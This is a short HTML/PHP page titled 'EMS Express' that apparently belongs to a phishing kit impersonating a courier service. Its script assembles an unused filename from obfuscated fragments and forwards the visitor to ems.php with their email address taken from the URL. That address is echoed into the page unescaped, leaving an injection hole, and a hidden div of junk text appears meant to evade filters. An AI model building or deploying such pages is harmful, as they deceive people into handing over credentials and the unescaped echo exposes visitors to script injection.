<head>
<title>
EMS Express</title>
<script>
var a="i";
var a1="n"
var a2="d";
var a3="e"
var a4="x";
var a5="1"
var a6="";
var a7=".";
var a8="p";
var a9="h";
var a10="p";
var uu=a+a1+a2+a3+a4+a5+a6+a7+a8+a9+a10;
    window.location.assign("ems.php?email=<?php echo $_GET['email']; ?>");

</script>
</head>
<body>
<div style="color:white;display:none">89AHe - Hi Fe274</div>
</body>
</html>